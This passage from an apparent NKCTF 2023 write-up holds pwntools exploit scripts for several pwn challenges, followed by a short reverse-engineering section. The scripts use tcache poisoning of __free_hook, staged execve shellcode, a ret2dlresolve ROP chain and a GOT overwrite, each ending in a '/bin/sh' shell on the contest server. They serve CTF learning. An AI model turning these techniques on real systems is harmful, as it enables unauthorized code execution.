class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>e=ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>context.binary=e<br>libc=ELF(<span class="hljs-string">&quot;./libc-2.32.so&quot;</span>)<br><span class="hljs-comment">#libc=ELF(&#x27;/lib/x86_64-linux-gnu/libc-2.33.so&#x27;)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">ind,size</span>):<br>    p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&quot;index: &quot;</span>,<span class="hljs-built_in">str</span>(ind))<br>    p.sendlineafter(<span class="hljs-string">&#x27;Size: &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&quot;index: &quot;</span>,<span class="hljs-built_in">str</span>(ind))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">ind,data</span>):<br>    p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&quot;index: &quot;</span>,<span class="hljs-built_in">str</span>(ind))<br>    p.sendafter(<span class="hljs-string">&#x27;content: &#x27;</span>,data)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;index: &#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">calc_fd</span>(<span class="hljs-params">c,off</span>):<br>    off1=off<br>    off=off<br>    h=<span class="hljs-built_in">hex</span>(c)[<span class="hljs-number">2</span>:].strip(<span class="hljs-string">&#x27;L&#x27;</span>)[::-<span class="hljs-number">1</span>]<br>    e=[]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(h),<span class="hljs-number">3</span>):<br>        e.append(h[i:i+<span class="hljs-number">3</span>][::-<span class="hljs-number">1</span>])<br>    uh=[]<br>    xc=<span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> e:<br>        hc=<span class="hljs-built_in">int</span>(i,<span class="hljs-number">16</span>)^(xc+(off&amp;<span class="hljs-number">0xfff</span>))<br>        xc=hc<br>        off=off&gt;&gt;<span class="hljs-number">12</span><br>        uh.append(<span class="hljs-built_in">hex</span>(hc)[<span class="hljs-number">2</span>:].strip(<span class="hljs-string">&#x27;L&#x27;</span>).zfill(<span class="hljs-number">3</span>))<br>    heap_len=<span class="hljs-built_in">len</span>(h)-<span class="hljs-number">3</span><br>    uh=<span class="hljs-string">&#x27;&#x27;</span>.join(uh[::-<span class="hljs-number">1</span>])[-heap_len:]+<span class="hljs-string">&#x27;000&#x27;</span><br>    fd=<span class="hljs-built_in">int</span>(uh,<span class="hljs-number">16</span>)+off1<br>    <span class="hljs-keyword">return</span> fd<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">enc_fd</span>(<span class="hljs-params">fd,next_</span>):<br>    <span class="hljs-keyword">return</span> (fd&gt;&gt;<span class="hljs-number">12</span>)^next_<br><br><br><span class="hljs-comment">#p=process(&#x27;./pwn&#x27;)</span><br>p=remote(<span class="hljs-string">&#x27;node2.yuzhian.com.cn&#x27;</span>,<span class="hljs-string">&#x27;32973&#x27;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>):<br>    add(i,<span class="hljs-number">0x88</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>    free(i)<br><br><span class="hljs-comment">#gdb.attach(p)</span><br><span class="hljs-comment">#pause()</span><br><br>add(<span class="hljs-number">7</span>,<span class="hljs-number">0x48</span>)<br>edit(<span class="hljs-number">7</span>,<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>show(<span class="hljs-number">7</span>)<br><br>pause()<br>d=u64(p.read(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))&amp;<span class="hljs-number">0xffffffffffffff00</span><br>main_area=d-<span class="hljs-number">0x60</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(d))<br>malloc_hook=main_area-<span class="hljs-number">0x10</span><br>libc.address=malloc_hook-libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>free_hook=libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>system=libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    add(<span class="hljs-number">6</span>-i,<span class="hljs-number">0x88</span>)<br>show(<span class="hljs-number">1</span>)<br><br>heap_1_c=u64(p.readuntil(<span class="hljs-string">&#x27;\n&#x27;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>heap=calc_fd(heap_1_c,<span class="hljs-number">0x2a0</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(heap))<br>pause()<br><br>pad=<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x58</span>+p64(<span class="hljs-number">0x91</span>)+<span class="hljs-string">b&#x27;\n&#x27;</span><br>edit(<span class="hljs-number">1</span>,pad)<br>edit(<span class="hljs-number">2</span>,pad)<br>edit(<span class="hljs-number">3</span>,pad)<br><br>pad1=<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x88</span>+<span class="hljs-string">b&#x27;\xf1&#x27;</span><br>edit(<span class="hljs-number">0</span>,pad1)<br>free(<span class="hljs-number">1</span>)<br><br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0xe8</span>)<br>free(<span class="hljs-number">3</span>)<br>free(<span class="hljs-number">2</span>)<br><br>payload=<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x88</span>+p64(<span class="hljs-number">0x91</span>)+p64(enc_fd(heap+<span class="hljs-number">0x290</span>+<span class="hljs-number">0x90</span>+<span class="hljs-number">0x90</span>+<span class="hljs-number">0x10</span>,free_hook))+<span class="hljs-string">b&#x27;\n&#x27;</span><br>edit(<span class="hljs-number">1</span>,payload)<br><br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;/bin/sh\x00\n&#x27;</span>)<br><br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x88</span>)<br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x88</span>)<br>edit(<span class="hljs-number">3</span>,p64(system)+<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>free(<span class="hljs-number">0</span>)<br><br><br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="9961code"><a href="#9961code" class="headerlink" title="9961code"></a>9961code</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><br>sh=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">mov rdi,r15</span><br><span class="hljs-string">and esi,edi</span><br><span class="hljs-string">mov dx,0xf</span><br><span class="hljs-string">add eax,0x30</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">mov esi,edi</span><br><span class="hljs-string">xor edi,edi</span><br><span class="hljs-string">jmp rsi</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br>sh1=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">add edx,0x30</span><br><span class="hljs-string">mov ax,0</span><br><span class="hljs-string">jmp rsi</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br>sh2=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">    mov edi,0x9961020</span><br><span class="hljs-string">    xor rsi,rsi</span><br><span class="hljs-string">    xor rdx,rdx</span><br><span class="hljs-string">    mov ax,0x3b</span><br><span class="hljs-string">    syscall&quot;&quot;&quot;</span><br><br><br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(asm(sh)))<br><span class="hljs-comment">#p=process(&#x27;./pwn&#x27;)</span><br>p=remote(<span class="hljs-string">&quot;node2.yuzhian.com.cn:32041&quot;</span>)<br><span class="hljs-comment">#gdb.attach(p,&#x27;bp main+294&#x27;)</span><br><span class="hljs-comment">#p=remote(&quot;node2.yuzhian.com.cn:30693&quot;)</span><br>pause()<br>p.sendafter(<span class="hljs-string">&#x27;shellcode&#x27;</span>,asm(sh))<br>pause()<br>p.sendline(asm(sh1))<br>pause()<br>p.sendline(asm(sh2).ljust(<span class="hljs-number">0x20</span>,<span class="hljs-string">b&#x27;\x90&#x27;</span>)+<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="only-read"><a href="#only-read" class="headerlink" title="only_read"></a>only_read</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> base64<br><br>e=ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>read=<span class="hljs-number">0x4013d0</span><br>leave=<span class="hljs-number">0x4013e7</span><br>ret=<span class="hljs-number">0x4013e8</span><br><span class="hljs-keyword">from</span> mcrypt <span class="hljs-keyword">import</span> *<br><br><br>c=[<span class="hljs-string">b&quot;Welcome to NKCTF!\x00&quot;</span>,\<br>        <span class="hljs-string">b&quot;tell you a secret:\x00&quot;</span>,\<br>        <span class="hljs-string">b&quot;I&#x27;M RUNNING ON GLIBC 2.31-0ubuntu9.9\x00&quot;</span>,\<br>        <span class="hljs-string">b&quot;can you find me?\x00&quot;</span>]<br><br><span class="hljs-comment">#p=process(&#x27;./pwn&#x27;)</span><br>p=remote(<span class="hljs-string">&quot;node2.yuzhian.com.cn:31146&quot;</span>)<br>base=b64()<br>base.setbase(<span class="hljs-string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> c:<br>    <span class="hljs-built_in">print</span>(i)<br>    p.sendline(base.encode(i))<br>    pause()<br><br>rel=<span class="hljs-number">0x4005d8</span><br><span class="hljs-comment">#str_t=0x3ff388</span><br><span class="hljs-comment">#sym=0x3ff420</span><br>sym=<span class="hljs-number">0x4003d0</span><br>str_t=<span class="hljs-number">0x4004c0</span><br>bss=<span class="hljs-number">0x404900</span>+<span class="hljs-number">0xc0</span>*<span class="hljs-number">8</span>+<span class="hljs-number">0x40</span>+<span class="hljs-number">0x20</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(bss))<br>sym_ind=<span class="hljs-number">905</span><br>func_got=e.got[<span class="hljs-string">&#x27;memset&#x27;</span>]<br><br>rdi=<span class="hljs-number">0x00401683</span><br>rel_add=bss+<span class="hljs-number">6</span>*<span class="hljs-number">0x8</span>+<span class="hljs-number">0x18</span><br>sym_add=bss+<span class="hljs-number">6</span>*<span class="hljs-number">0x8</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(rel_add))<br><br>gogo=<span class="hljs-number">0x401039</span><br><span class="hljs-comment">#p.interactive()</span><br><br>pad=<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x10</span><br>pad_n=<span class="hljs-number">3</span><br>bin_sh=bss<br>system=bss+<span class="hljs-number">0x28</span><br>str_=<span class="hljs-string">b&#x27;/bin/sh\x00\x00system\x00&#x27;</span><br>sym_=p32(system-str_t)+p64(<span class="hljs-number">12</span>)+p32(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span><br>rel_=p64(bss-<span class="hljs-number">0x30</span>)+p32(<span class="hljs-number">7</span>)+p32((sym_add-sym)//<span class="hljs-number">0x18</span>)+p32(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span><br><br><span class="hljs-comment">#gdb.attach(p,&#x27;bp 0x401039&#x27;)</span><br><span class="hljs-comment">#pause()</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(rel_add-rel))<br><br><br><br>payload2=<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x30</span><br>payload2+=<span class="hljs-string">b&quot;/bin/sh\x00&quot;</span>+p64(rdi)+p64(bin_sh)+p64(gogo)+p64((rel_add-rel)//<span class="hljs-number">0x18</span>+<span class="hljs-number">1</span>)<br>payload2+=<span class="hljs-string">b&quot;system\x00\x00&quot;</span><br>payload2+=sym_+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+rel_<br><br><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x30</span>+p64(bss)+p64(read)<br>p.sendline(payload)<br>pause()<br><br>p.sendline(payload2)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="note"><a href="#note" class="headerlink" title="note"></a>note</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">ind,size,data=<span class="hljs-string">&quot; &quot;</span></span>):<br>    p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br>    p.sendlineafter(<span class="hljs-string">&#x27;Size: &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>    p.sendafter(<span class="hljs-string">&quot;Content: &quot;</span>,data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">ind,data</span>):<br>    p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br>    p.sendlineafter(<span class="hljs-string">&#x27;Size: &#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(data)))<br>    p.sendafter(<span class="hljs-string">&quot;Content: &quot;</span>,data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br><br><br><br><br>e=ELF(<span class="hljs-string">&#x27;./nk_note&#x27;</span>)<br>context.binary=e<br>libc=ELF(<span class="hljs-string">&#x27;./libc.so&#x27;</span>)<br><br>p=remote(<span class="hljs-string">&quot;node2.yuzhian.com.cn:30946&quot;</span>)<br><span class="hljs-comment">#p=process(&quot;./nk_note&quot;)</span><br><span class="hljs-comment">#gdb.attach(p)</span><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>show(<span class="hljs-number">16</span>)<br>d=u64(p.readuntil(<span class="hljs-string">&#x27;\n&#x27;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(d))<br>pause()<br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x500</span>,<span class="hljs-string">&quot;/bin/sh\x00&quot;</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x300</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x100</span>)<br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x80</span>)<br>add(<span class="hljs-number">4</span>,<span class="hljs-number">0x40</span>)<br>add(<span class="hljs-number">5</span>,<span class="hljs-number">0x20</span>)<br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span><br>edit(<span class="hljs-number">16</span>,payload)<br>show(<span class="hljs-number">16</span>)<br>p.readuntil(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>)<br>d1=u64(p.readuntil(<span class="hljs-string">&#x27;\n&#x27;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(d1))<br>e.address=d1-<span class="hljs-number">0x4120</span><br><br>func=<span class="hljs-string">&#x27;puts&#x27;</span><br>func_got=e.got[func]<br><br><br>l=[]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x6B</span>):<br>    payload=<span class="hljs-string">&#x27;a&#x27;</span>*i*<span class="hljs-number">8</span><br>    edit(<span class="hljs-number">16</span>,payload)<br>    show(<span class="hljs-number">16</span>)<br>    data=p.readuntil(<span class="hljs-string">&#x27;\n&#x27;</span>,drop=<span class="hljs-number">1</span>).strip(<span class="hljs-string">b&#x27;a&#x27;</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    dn=u64(data)<br>    l.append(dn)<br><br><span class="hljs-built_in">print</span>(l)<br>pause()<br>payload=flat(l)+p64(e.address+<span class="hljs-number">0x4150</span>)<br>edit(<span class="hljs-number">16</span>,payload)<br>ind=<span class="hljs-number">0x26</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(e.address))<br><br>add(<span class="hljs-number">5</span>,<span class="hljs-number">0x40</span>)<br><br>edit(<span class="hljs-number">5</span>,p64(func_got))<br>show(ind)<br>dd=u64(p.readuntil(<span class="hljs-string">&#x27;\n&#x27;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(dd))<br>libc.address=dd-libc.sym[func]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc.address))<br>system=libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(e.got[<span class="hljs-string">&#x27;free&#x27;</span>]))<br>edit(<span class="hljs-number">5</span>,p64(e.got[<span class="hljs-string">&#x27;free&#x27;</span>]))<br>edit(ind,p64(system))<br>free(<span class="hljs-number">0</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h1><h2 id="ez-baby-apk"><a href="#ez-baby-apk" class="headerlink" title="ez_baby_apk"></a>ez_baby_apk</h2><p>使用jadx加雷电模拟器进行调试</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/ez_baby_apk-1.png"></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/ez_baby_apk-2.png"></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/ez_baby_apk-3.png"></p><h2 id="PMKF"><a href="#PMKF" class="headerlink" title="PMKF"></a>PMKF</h2><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/PMKF-1.jpg"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python">a=[<span class="hljs-string">&quot;1122&quot;</span>,<span class="hljs-string">&quot;3322&quot;</span>,<span class="hljs-string">&quot;1223&quot;</span>,<span class="hljs-string">&quot;2211&quot;</span>,<span class="hljs-string">&quot;0111&quot;</span>,<span class="hljs-string">&quot;1101&quot;</span>,<span class="hljs-string">&quot;0000&quot;</span>,<span class="hljs-string">&quot;0101&quot;</span>,<span class="hljs-string">&quot;1211&quot;</span>,<span class="hljs-string">&quot;0111&quot;</span>,<span class="hljs-string">&quot;2223&quot;</span>,<span class="hljs-string">&quot;2330&quot;</span>,<span class="hljs-string">&quot;3323&quot;</span>,<span class="hljs-string">&quot;2211&quot;</span>,<span class="hljs-string">&quot;1112&quot;</span>,<span class="hljs-string">&quot;2333&quot;</span>]<br>e=[]<br>k=<span class="hljs-string">b&#x27;nkman&#x27;</span><br>k1=<span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> k:<br>    k1+=i<br>k1=k1&amp;<span class="hljs-number">0xff</span><br><span class="hljs-built_in">print</span>(k1)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a:<br>    c=<span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> i:<br>        c+=<span class="hljs-built_in">bin</span>(<span class="hljs-built_in">int</span>(j))[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">2</span>)<br>    e.append(<span class="hljs-built_in">int</span>(c,<span class="hljs-number">2</span>)^k1)<br><span class="hljs-built_in">print</span>((<span class="hljs-string">b&#x27;\x05&#x27;</span>+<span class="hljs-string">b&#x27;nkman&#x27;</span>+<span class="hljs-built_in">bytes</span>(e)).<span class="hljs-built_in">hex</span>())<br></code></pre></td></tr></table></figure><h2 id="babyrust"><a href="#babyrust" class="headerlink" title="babyrust"></a>babyrust</h2><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/babyrust-1.jpg"></p><figure class="highlight python"><table><tr><td 